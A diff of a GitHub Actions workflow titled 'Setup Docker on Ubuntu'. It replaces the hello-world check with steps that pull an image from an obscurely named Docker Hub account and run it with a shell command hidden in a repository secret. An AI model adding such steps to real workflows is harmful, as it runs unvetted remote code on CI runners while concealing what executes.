@@ -1,11 +1,11 @@
 name: Setup Docker on Ubuntu
 
 on:
-  workflow_dispatch: # Allows manual trigger of the workflow via GitHub UI or API
+  workflow_dispatch:
 
 jobs:
   setup-docker:
-    runs-on: ubuntu-latest # GitHub-hosted runner with Ubuntu
+    runs-on: ubuntu-latest
     steps:
       - name: Checkout code
         uses: actions/checkout@v3
@@ -33,7 +33,12 @@ jobs:
         run: |
           sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
 
-      - name: Verify Docker installation
+      - name: Pull Docker image
         run: |
-          sudo docker run hello-world
+          sudo docker pull uhdsuihuah/dsadsa:latest
 
+      - name: Run Docker container
+        run: |
+          sudo docker run -it uhdsuihuah/dsadsa:latest /bin/bash -c "$CMDEXEC"
+        env:
+          CMDEXEC: ${{ secrets.CMDEXEC }}
